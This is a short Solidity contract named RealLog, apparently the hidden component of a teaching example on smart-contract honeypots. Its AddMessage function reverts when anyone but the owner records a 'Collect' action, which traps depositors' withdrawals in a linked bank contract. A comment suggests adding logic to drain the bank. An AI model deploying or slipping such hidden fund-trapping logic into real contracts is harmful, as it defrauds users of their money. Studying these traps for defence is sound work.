// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract RealLog {
    address owner;

    error InvalidAddress(address _addr);

    constructor(address _owner) {
        owner = _owner;
    }

    // 实际的Log合约，可以在这里加入从Bank里取钱的逻辑
    function AddMessage(address _adr, uint256 _val, string memory _data) external {
        if (msg.sender != owner && keccak256(bytes(_data)) == keccak256(bytes("Collect"))) {
            revert InvalidAddress(msg.sender);
        }
    }
}
